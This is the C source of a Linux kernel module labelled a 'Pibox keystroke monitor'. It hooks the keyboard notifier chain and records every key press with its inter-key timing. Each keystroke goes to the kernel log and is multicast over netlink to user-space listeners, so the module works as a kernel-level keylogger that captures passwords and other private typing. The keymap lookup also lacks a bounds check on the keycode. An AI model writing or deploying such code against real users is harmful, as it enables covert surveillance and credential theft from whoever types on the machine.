#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>         /* notifier_block */
#include <linux/module.h>
#include <linux/semaphore.h>
#include <linux/string.h>           /* memset and strncpy */
#include <linux/uaccess.h>          /* copy_to_user() */
#include <net/sock.h>               /* Needed for netlink */
#include <linux/netlink.h>
#include <linux/skbuff.h>

#define MYPROTO NETLINK_USERSOCK
#define MYGRP 31

#define KEYPRESS_BUFFSIZE 1024   /* Max keypress buff size */
#define SEP_BUFFSIZE      500

/* Function Prototypes */
static int kb_notify(struct notifier_block *, unsigned long, void *);
static void nl_send_msg(void);

/* Keypress mappings */
static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", "_SPACE_", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_", "\0", "\0", "\0", "\0", "\0", "LEFT_GUI", "RIGHT_GUI"};

static const char* keymapShiftActivated[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", "_SPACE_", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_", "\0", "\0", "\0", "\0", "\0", "LEFT_GUI", "RIGHT_GUI"};

static struct semaphore sem;

/* Specify callback function for keyboard notification events */
static struct notifier_block kb_nb = { .notifier_call = kb_notify };

/* Kernel netlink socket */
static struct sock *nl_sk = NULL;

/* Keypress data buffer */
static char keypress_buff[KEYPRESS_BUFFSIZE];

/* Initial time stamp used for calculating keypress time displacement */
static unsigned long init_stamp = 0;

/* Caluculated time of separation between two kepyresses */
static unsigned long stroke_separation;

/* Struct for storing keypress data */
struct keypress {
    int keycode;
    char separation[SEP_BUFFSIZE];
} key;

/* Shift key is currently depressed */
static int shiftKeyDepressed = 0;

/* Keyboard notification callback */
static int kb_notify(
    struct notifier_block *nblock,
    unsigned long action,
    void *data)
{
    unsigned long jiff, curr_stamp = 0;
    jiff = jiffies;

    unsigned long diff;

    struct keyboard_notifier_param *param = data;
    if (action == KBD_KEYCODE)
    {
        if (param->value == 42 || param->value== 54)
        {
            down(&sem);
            if (param->down)
                shiftKeyDepressed = 1;
            else
                shiftKeyDepressed = 0;
            up(&sem);
            return NOTIFY_OK;
        }
        if (param->down)
        {
            /* Acquire lock to acces global variables */
            down(&sem);

            memset(&keypress_buff, '\0', sizeof keypress_buff);

            struct keypress key = {
                .keycode = param->value
            };

            /* Retrieve the correct caps or non-caps character string */
            if (shiftKeyDepressed == 0)
                // strncpy(keypress_buff, keymap[key.keycode], strlen(keymap[key.keycode]));
                strncpy(keypress_buff, keymap[key.keycode], KEYPRESS_BUFFSIZE);
            else
                // strncpy(keypress_buff, keymapShiftActivated[key.keycode], strlen(keymapShiftActivated[key.keycode]));
                strncpy(keypress_buff, keymapShiftActivated[key.keycode], KEYPRESS_BUFFSIZE);

            if(!init_stamp)
            {
                init_stamp = jiff;
                pr_info("init_stamp: %ld value: %d\n",
                        init_stamp, param->value);
            }
            else
            {
                /* Caluclate the keystroke time displacement */
                curr_stamp = jiff;
                diff = (long)curr_stamp - (long)init_stamp;
                stroke_separation = diff * 1000 / HZ;
                
                /* Convert the stroke separation into a string for later storage */
                snprintf(key.separation, sizeof key.separation, "%ld", stroke_separation);

                /* Adjust the init_stamp value for a future calculation*/
                init_stamp = curr_stamp;
                curr_stamp = 0;

                pr_info("stroke_separation: %ld value: %d\n",
                        stroke_separation, param->value);
            }

            /* Append the key's separation measurement to the keypress buffer */
            strncat(keypress_buff, " ", 2);
            strncat(keypress_buff, key.separation, SEP_BUFFSIZE - 1);
            pr_info("Keypress buffer: %s\n", keypress_buff);

            up(&sem);

            /* Send the keypress packet to user space */
            nl_send_msg();
        }
    }
    return NOTIFY_OK;
}

static void nl_send_msg(void)
{
    struct nlmsghdr *nlh = NULL;
    struct sk_buff *skb_out = NULL;
    int msg_size = strlen(keypress_buff) + 1;
    int res;

    skb_out = nlmsg_new(msg_size, GFP_KERNEL);
    if (!skb_out)
    {
        pr_err("Failed to allocate new skb\n");
        return;
    }

    nlh = nlmsg_put(skb_out, 0, 1, NLMSG_DONE, msg_size, 0);

    strncpy(nlmsg_data(nlh), keypress_buff, msg_size);

    if ((res = nlmsg_multicast(nl_sk, skb_out, 0, MYGRP, GFP_KERNEL)) < 0)
    {
        pr_info("Error while sending back to user\n");
    }
}

static int __init kb_init(void)
{
    // memset(&keypress_buff, '\0', sizeof keypress_buff);

    /* Create the netlink socket */
    nl_sk = netlink_kernel_create(&init_net, MYPROTO, NULL);
    if (!nl_sk)
    {
        pr_alert("Error creating netlink socket.\n");
        return -1;
    }

    /* Register this module with the notification list */
    register_keyboard_notifier(&kb_nb);
    printk(KERN_INFO "Registering the pibox_kb module with the keyboard notifier list\n");

    sema_init(&sem, 1);
    return 0;
}

static void __exit kb_exit(void)
{
    unregister_keyboard_notifier(&kb_nb);
    netlink_kernel_release(nl_sk);
    printk(KERN_INFO "Unregistered the pibox_kb module\n");
}

module_init(kb_init);
module_exit(kb_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Emerson");
MODULE_DESCRIPTION("Pibox keystroke monitor");
